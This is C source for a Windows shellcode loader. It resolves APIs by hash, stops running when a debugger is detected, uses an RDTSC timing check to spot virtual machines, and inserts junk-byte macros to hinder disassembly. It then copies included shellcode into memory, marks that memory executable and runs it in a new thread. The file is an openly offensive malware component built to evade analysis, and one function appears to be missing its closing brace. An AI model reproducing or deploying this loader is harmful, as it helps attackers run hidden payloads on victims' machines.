#include "ldr.h"
#include "payload.c" //shellcode is meant to be an unsigned char array defined in payload.c

#define TRUE 1
#define FALSE 0


volatile int anti_analysis_flag = 0;


static inline __attribute__((always_inline))BOOL checkdbg(void){
    PPEB peb = ldr_get_peb();

    if (peb->BeingDebugged != 0){
        return TRUE;
    }
    else{
        return FALSE;
    }
}

static inline __attribute__((always_inline)) BOOL AntiVmRdtsc(void)
{
    FN_GetProcessHeap GetHeap = (FN_GetProcessHeap) ldr_get_by_hash(HASH_GETPROCESSHEAP, 0);
    FN_CloseHandle     CloseH = (FN_CloseHandle)    ldr_get_by_hash(HASH_CLOSEHANDLE, 0);
    if (!GetHeap || !CloseH) return TRUE;

    unsigned long long tsc1, tsc2, tsc3, delta1, delta2;
    int i;

    for (i = 0; i < 10; i++) {
        tsc1 = ldr_rdtsc();
        GetHeap();
        tsc2 = ldr_rdtsc();
        CloseH((HANDLE)0);
        tsc3 = ldr_rdtsc();

        delta1 = tsc2 - tsc1;
        delta2 = tsc3 - tsc2;
        
       
        if (anti_analysis_flag == 1) {
            delta1 ^= 0xDEADBEEF;
            delta2 = (delta1 * delta2) >> 2;
            if (delta2 == 0) return TRUE; // F+
        }

        if (delta1 == 0) continue; 
        if (delta2 / delta1 >= 10)
            return FALSE;  // VM
    }
    return TRUE;  // NOT VM

#define JUNK_BYTES \
    __asm__ volatile ( \
        "jmp 1f \n" \
        ".byte 0xE8, 0x88, 0x77, 0x66, 0x55 \n" \
        "1: \n" \
    );

#define NOPSLED \
    __asm__ volatile ( \
        "nop\n"\
        "nop\n"\
        "nop\n"\
        "nop\n"\
        "nop\n"\
        "nop\n"\
        "nop\n"\
        "nop\n"\
    );

__attribute__((section(".text")))
void loader_main(void)
{
    JUNK_BYTES

    FN_VirtualAlloc          VAlloc   = (FN_VirtualAlloc)         ldr_get_by_hash(HASH_VIRTUALALLOC,          0);
    FN_VirtualProtect        VProtect = (FN_VirtualProtect)        ldr_get_by_hash(HASH_VIRTUALPROTECT,        0);
    FN_VirtualFree           VFree    = (FN_VirtualFree)           ldr_get_by_hash(HASH_VIRTUALFREE,           0);
    JUNK_BYTES
    FN_RtlMoveMemory         RtlMM    = (FN_RtlMoveMemory)         ldr_get_by_hash(HASH_RTLMOVEMEMORY,         0);
    FN_FlushInstructionCache FlushIC  = (FN_FlushInstructionCache) ldr_get_by_hash(HASH_FLUSHINSTRUCTIONCACHE, 0);
    FN_CreateThread          CThread  = (FN_CreateThread)          ldr_get_by_hash(HASH_CREATETHREAD,          0);
    FN_WaitForSingleObject   WFSO     = (FN_WaitForSingleObject)   ldr_get_by_hash(HASH_WAITFORSINGLEOBJECT,   0);
    FN_CloseHandle           CloseH   = (FN_CloseHandle)           ldr_get_by_hash(HASH_CLOSEHANDLE,           0);
    FN_IsDebuggerPresent     IsDebPresent = (FN_IsDebuggerPresent)       ldr_get_by_hash(HASH_ISDEBUGGERPRESENT,     0);

    if (!VAlloc || !VProtect || !RtlMM || !CThread || !WFSO || !CloseH || !IsDebPresent) return;

    if (checkdbg() || IsDebPresent()) return;

    SIZE_T sclen = sizeof(shellcode);
    BYTE* mem = (BYTE*)VAlloc(0, sclen, MEM_COMMIT_RESERVE, PAGE_READWRITE);
    if (!mem) return;
    

    RtlMM(mem, shellcode, sclen);

    if (FlushIC) FlushIC((HANDLE)-1, mem, sclen);

    DWORD old = 0;
    VProtect(mem, sclen, PAGE_EXEC_READ, &old);

    NOPSLED

    HANDLE hThread = CThread(0, 0, (LPTHREAD_START_ROUTINE)mem, 0, 0, 0);
    if (!hThread) {
        if (VFree) VFree(mem, 0, MEM_RELEASE);
        return;
    }

    WFSO(hThread, INFINITE);
    CloseH(hThread);
    if (VFree) VFree(mem, 0, MEM_RELEASE);
}
